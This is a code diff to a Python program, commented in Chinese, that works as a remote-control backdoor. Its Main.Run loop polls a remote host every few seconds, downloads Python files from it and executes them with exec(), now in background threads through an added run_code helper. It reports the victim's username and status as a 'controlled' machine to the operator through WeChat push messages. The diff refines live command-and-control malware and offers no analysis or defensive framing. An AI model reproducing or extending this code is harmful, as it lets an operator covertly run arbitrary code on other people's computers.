@@ -6,10 +6,12 @@ import json
 import time
 import requests
 import platform
+from _thread import *
 
 
 class Function:
-    def __init__(self):
+    def __init__(self, main):
+        self.main = main
         self.number_of_executions = 0
         ...
     def Connect_Network(self):
@@ -19,6 +21,18 @@ class Function:
             return True
         except requests.ConnectionError:
             return False
+
+    def run_code(self, code):
+        self.number_of_executions += 1
+        try:
+            exec(code)
+        except Exception as bc:
+            print(bc)
+            try:
+                self.main.wechat_push.Alleged_information(f'{self.main.sys_username}代码报错：{bc}')
+            except Exception as bcl:
+                print("发送失败", bcl)
+
 class WeChat_push:
     """
     微信测试号推送被控信息
@@ -79,7 +93,7 @@ class WeChat_push:
 
 class Main:
     def __init__(self):
-        self.fun = Function()
+        self.fun = Function(self)
         self.wechat_push = WeChat_push()
         # 初始化配置
         self.wechat_push.appID = 'wxfe87182bd1371294'
@@ -98,30 +112,26 @@ class Main:
     def Run(self):
         while self.running:
             if self.fun.Connect_Network():
-                if not self.startup:    # 程序启动连接到网络执行一次（python代码
-                    qq = requests.get('https://yc.052024.xyz/Control_files/Start_execution.py')
-                    try:
-                        exec(qq.text)       # 程序启动的第一次联网执行远程代码
-                    except Exception as bcr:
-                        print(bcr)
-                    if os.name == 'nt':  # win相同获取用户名
-                        self.sys_username = os.getenv('USERNAME')
+                try:
+                    if not self.startup:    # 程序启动连接到网络执行一次（python代码
+                        qq = requests.get('https://yc.052024.xyz/Control_files/Start_execution.py')
+                        start_new_thread(self.fun.run_code, (qq.text,))     # 程序启动的第一次联网执行远程代码
+                        if os.name == 'nt':  # win相同获取用户名
+                            self.sys_username = os.getenv('USERNAME')
+                        else:
+                            self.sys_username = os.getenv('USER')
+                        self.wechat_push.Alleged_information(f'{self.sys_username}已联网启动+初始代码执行')
+                        self.startup = True
                     else:
-                        self.sys_username = os.getenv('USER')
-                    self.wechat_push.Alleged_information(f'{self.sys_username}已联网启动+初始代码执行')
-                    self.startup = True
-                else:
-                    # 代码有变化就执行
-                    qq = requests.get('https://yc.052024.xyz/Control_files/Change_Execution.py')
-
-                    if self.Current_Code != qq.text:
-                        try:
-                            exec(qq.text)
-                        except Exception as bc:
-                            self.wechat_push.Alleged_information(f'{self.sys_username}代码报错：{bc}')
-                        self.Current_Code = qq.text
-                    else:
-                        print('code一样，等待新执行')
+                        # 代码有变化就执行
+                        qq = requests.get('https://yc.052024.xyz/Control_files/Change_Execution.py')
+                        if self.Current_Code != qq.text:
+                            start_new_thread(self.fun.run_code, (qq.text, ))
+                            self.Current_Code = qq.text
+                        else:
+                            print('code一样，等待新执行')
+                except Exception as bc:
+                    print(bc)
 
             time.sleep(3)
 
